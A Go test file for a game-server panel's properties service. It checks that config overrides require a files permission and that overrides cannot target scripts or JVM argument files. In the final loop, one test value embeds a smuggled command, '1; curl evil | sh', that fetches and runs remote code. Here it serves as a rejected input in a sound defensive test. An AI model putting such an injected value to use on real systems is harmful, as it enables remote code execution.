package services

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"connectrpc.com/connect"
	"github.com/discohaus/discopanel/internal/auth"
	storage "github.com/discohaus/discopanel/internal/db"
	"github.com/discohaus/discopanel/internal/metrics"
	"github.com/discohaus/discopanel/internal/rbac"
	"github.com/discohaus/discopanel/pkg/config"
	"github.com/discohaus/discopanel/pkg/logger"
	optionsv1 "github.com/discohaus/discopanel/pkg/proto/discopanel/options/v1"
	v1 "github.com/discohaus/discopanel/pkg/proto/discopanel/v1"
	"github.com/discohaus/discopanel/pkg/runtimespec"
)

func TestConfigOverridesNeedFilesGrant(t *testing.T) {
	ctx := context.Background()
	cfg := &config.Config{}
	cfg.Database.Path = filepath.Join(t.TempDir(), "props.db")
	cfg.Database.AutoMigrate = true
	store, err := storage.NewSQLiteStore(cfg)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { store.Close() })
	enforcer, err := rbac.NewEnforcer(store.DB())
	if err != nil {
		t.Fatal(err)
	}
	props := optionsv1.ResourceType_RESOURCE_TYPE_SERVER_PROPERTIES
	filesRes := optionsv1.ResourceType_RESOURCE_TYPE_FILES
	read, update := optionsv1.ActionType_ACTION_TYPE_READ, optionsv1.ActionType_ACTION_TYPE_UPDATE
	grants := map[string][]*v1.Permission{
		"propsonly": {{Resource: props, Action: read, ObjectId: "srv-1"}, {Resource: props, Action: update, ObjectId: "srv-1"}},
		"editor": {
			{Resource: props, Action: read, ObjectId: "srv-1"}, {Resource: props, Action: update, ObjectId: "srv-1"},
			{Resource: filesRes, Action: read, ObjectId: "srv-1"}, {Resource: filesRes, Action: update, ObjectId: "srv-1"},
		},
	}
	for role, perms := range grants {
		if err := store.CreateRole(ctx, &v1.Role{Id: "role-" + role, Name: role}); err != nil {
			t.Fatal(err)
		}
		if err := enforcer.SetPermissionsForRole(role, perms); err != nil {
			t.Fatal(err)
		}
	}
	dataPath := t.TempDir()
	if err := store.CreateServer(ctx, &v1.Server{Id: "srv-1", Name: "one", DataPath: dataPath}); err != nil {
		t.Fatal(err)
	}

	log := logger.New()
	svc := NewPropertiesService(store, cfg, nil, nil, enforcer, metrics.NewRecorder(store, log), log)
	as := func(role string) context.Context {
		return auth.WithUser(ctx, &v1.User{Id: role, Username: role, Roles: []string{role}})
	}
	update1 := connect.NewRequest(&v1.UpdateConfigOverridesRequest{ServerId: "srv-1", Files: []*v1.ConfigOverrideFile{
		{Path: "config/a.toml", Entries: []*v1.ConfigOverrideEntry{{Key: "a.b", Value: "1"}}},
	}})

	_, err = svc.UpdateConfigOverrides(as("propsonly"), update1)
	if connect.CodeOf(err) != connect.CodePermissionDenied {
		t.Fatalf("properties grant alone: err = %v, want permission denied", err)
	}
	if _, err := os.Stat(runtimespec.ConfigOverridesPath(dataPath)); !os.IsNotExist(err) {
		t.Fatalf("denied update still wrote overrides: %v", err)
	}
	_, err = svc.GetConfigOverrides(as("propsonly"), connect.NewRequest(&v1.GetConfigOverridesRequest{ServerId: "srv-1"}))
	if connect.CodeOf(err) != connect.CodePermissionDenied {
		t.Fatalf("properties grant alone read: err = %v, want permission denied", err)
	}

	if _, err := svc.UpdateConfigOverrides(as("editor"), update1); err != nil {
		t.Fatalf("editor update: %v", err)
	}
	res, err := svc.GetConfigOverrides(as("editor"), connect.NewRequest(&v1.GetConfigOverridesRequest{ServerId: "srv-1"}))
	if err != nil || len(res.Msg.Files) != 1 || res.Msg.Status[0].Exists {
		t.Fatalf("editor read: %v %+v", err, res)
	}

	// Explicit formats cannot retarget scripts or other file types
	for _, f := range []*v1.ConfigOverrideFile{
		{Path: "config/a.json", Format: v1.ConfigFormat_CONFIG_FORMAT_PROPERTIES},
		{Path: "run.sh", Format: v1.ConfigFormat_CONFIG_FORMAT_PROPERTIES},
		{Path: "user_jvm_args.txt", Format: v1.ConfigFormat_CONFIG_FORMAT_PROPERTIES},
	} {
		f.Entries = []*v1.ConfigOverrideEntry{{Key: "x", Value: "1; curl evil | sh"}}
		_, err := svc.UpdateConfigOverrides(as("editor"), connect.NewRequest(&v1.UpdateConfigOverridesRequest{ServerId: "srv-1", Files: []*v1.ConfigOverrideFile{f}}))
		if connect.CodeOf(err) != connect.CodeInvalidArgument {
			t.Fatalf("%s as %v: err = %v, want invalid argument", f.Path, f.Format, err)
		}
	}
}
